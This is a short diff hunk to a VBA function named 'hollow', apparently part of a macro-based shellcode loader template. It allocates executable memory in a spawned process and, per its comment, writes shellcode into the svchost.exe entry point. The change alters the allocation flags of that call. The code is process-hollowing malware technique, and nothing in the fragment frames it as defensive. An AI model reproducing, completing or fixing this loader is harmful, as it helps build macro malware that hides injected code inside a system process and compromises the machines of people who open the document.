@@ -88,7 +88,7 @@ Function hollow()
 
     Dim addr as LongPtr
 
-    addr = VirtualAllocEx(pi.hProcess, ByVal 0&, {shellcodeSize},  &H1000, &H20)
+    addr = VirtualAllocEx(pi.hProcess, ByVal 0&, {shellcodeSize},  &H3000, &H20)
 
     ' Write the shellcode into the svchost.exe entry point
     a = WriteProcessMemory(pi.hProcess, addr, buf(0), scSize, tmp)
